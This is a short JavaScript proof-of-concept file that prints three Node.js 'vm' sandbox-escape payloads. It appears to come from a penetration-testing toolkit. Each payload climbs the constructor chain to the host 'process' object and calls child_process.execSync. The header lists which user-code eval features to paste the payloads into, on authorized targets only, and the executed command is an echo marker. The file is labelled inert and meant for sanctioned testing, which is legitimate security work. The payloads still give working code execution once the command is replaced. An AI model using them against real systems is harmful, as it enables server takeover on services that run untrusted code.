/*
  Safe PoC -> x8bitranjit
  INERT BY DESIGN: running this file only PRINTS the escape payloads -
  paste them into the target's sandboxed eval feature (authorized only).

  WHAT THIS DEMONSTRATES: Node.js sandbox escapes.
  - node 'vm' module is NOT a security sandbox; escapes are trivial.
  - vm2 hardened it until repeated escapes -> library DEPRECATED (2023);
    if a target still runs vm2, treat as vulnerable.

  WHERE TO USE: features that eval user code - formula engines, template
  playgrounds, "custom JS filter" fields, bot/script builders.
*/
console.log("== node vm escape (classic) ==");
console.log(String.raw`
  const proc = this.constructor.constructor('return process')();
  proc.mainModule.require('child_process').execSync('echo "$Safe PoC -> x8bitranjit"').toString();
`);

console.log("== node vm escape (via Function, no this) ==");
console.log(String.raw`
  const proc = Function('return process')();
  proc.mainModule.require('child_process').execSync('echo "$Safe PoC -> x8bitranjit"');
`);

console.log("== node vm escape (exceptions leak host fn) ==");
console.log(String.raw`
  try { null.x } catch (e) {
    const proc = e.constructor.constructor('return process')();
    proc.mainModule.require('child_process').execSync('echo "$Safe PoC -> x8bitranjit"');
  }
`);

console.log("== Benign rule: echo/id as the only command; capture output or OOB ==");
